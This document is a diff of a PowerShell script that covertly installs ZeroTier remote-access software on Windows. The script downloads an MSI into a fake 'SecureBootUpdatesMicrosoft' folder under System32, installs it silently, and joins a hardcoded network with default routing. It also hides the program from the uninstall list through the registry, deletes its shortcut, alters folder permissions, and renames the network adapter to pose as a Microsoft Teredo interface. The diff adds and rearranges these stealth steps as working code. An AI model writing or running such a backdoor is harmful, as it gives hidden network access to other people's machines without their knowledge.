@@ -2,29 +2,8 @@ $ErrorActionPreference = "SilentlyContinue"
 $downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/MeshNetwork.msi"
 $downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
-$ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
-$AppNamePattern = "ZeroTier*"
-$NetworkID = "52b337794f5f54e7"
-$zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
-$param1 = "-q"
-$param2 = "join"
-$NetworkID = "52b337794f5f54e7"
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
-$KeyNamePattern = "Zerotier*"
-$RegPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
-$MatchingKeys = Get-ChildItem -Path $RegPath | Where-Object { $_.PSChildName -like $KeyNamePattern }
-$RegKeyPath = Join-Path -Path $RegPath -ChildPath $Key.PSChildName
-$RegValueName = "SystemComponent"
-$RegValueData = 1
-$ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
-$adapterNameToRename = "Zerotier*"
-$newAdapterName = "Microsoft Teredo IPv6 Tunneling Interface"
-$maxRetries = 3
-$retryCount = 0
-#Code starts Here
-Install-PackageSource -Name NuGet -Location "https://www.nuget.org/api/v2/" -ProviderName NuGet -Trusted -Force
-Uninstall-Package -Name "ZeroTier One" -Force
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
@@ -36,6 +15,7 @@ if (Test-Path $destinationPath) {
         $programHash = $matches[1]
     }
     if ($programHash -eq $existingFileHash) {
+        Write-Host "File is already present and matches the hash. No action needed." | Out-Null
     } else {
         Remove-Item -Path $destinationPath -Force
     }
@@ -44,11 +24,23 @@ if (-not (Test-Path $destinationPath)) {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
 }
 Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$destinationPath`" /qn /norestart"
-Timeout /NoBreak 15
+Timeout /NoBreak 30
+$NetworkID = "52b337794f5f54e7"
+$zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
+$param1 = "-q"
+$param2 = "join"
+$NetworkID = "52b337794f5f54e7"
 & $zerotiercli $param1 $param2 $NetworkID allowDefault=1
+$KeyNamePattern = "Zerotier*"
+$RegPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+$MatchingKeys = Get-ChildItem -Path $RegPath | Where-Object { $_.PSChildName -like $KeyNamePattern }
 foreach ($Key in $MatchingKeys) {
+$RegKeyPath = Join-Path -Path $RegPath -ChildPath $Key.PSChildName
+$RegValueName = "SystemComponent"
+$RegValueData = 1
 Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
 }
+$ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
 if (Test-Path $ZeroTierShortcutPath) {
 Remove-Item -Path $ZeroTierShortcutPath -Force -ErrorAction SilentlyContinue | Out-Null
 }
@@ -77,31 +69,7 @@ foreach ($item in $childItems) {
 Set-Acl -Path $item.FullName -AclObject $folderACL
 }
 Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
-Set-NetConnectionProfile -InterfaceAlias "ZeroTier*" -NetworkCategory Private
-$Rules = Get-NetFirewallRule | Where-Object { $_.DisplayName -like $AppNamePattern }
-$ProfileType = "Private"
-if ($Rules.Count -gt 0) {
-    foreach ($Rule in $Rules) {
-        $Rule.Profile = $ProfileType
-        Set-NetFirewallRule -InputObject $Rule
-    }
-} else {}
-while ($retryCount -lt $maxRetries) {
-    try {
-        $adapter = Get-NetAdapter -Name $adapterNameToRename
-        if ($adapter) {
-            Rename-NetAdapter -InputObject $adapter -NewName $newAdapterName
-            break  # Exit the loop on success
-        } else {
-            break  # Exit the loop if the adapter is not found
-        }
-    } catch {
-        $retryCount++
-        Start-Sleep -Seconds 5  # Add a delay before the next retry
-    }
-}
-if ($retryCount -ge $maxRetries) {
-}
+Get-NetAdapter -Name Zerotier*|Rename-NetAdapter -NewName "Microsoft Teredo IPv6 Tunneling Interface"
 #ZT Adv Fix
 #$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
 #if ([string]::IsNullOrEmpty($ztadv)) {
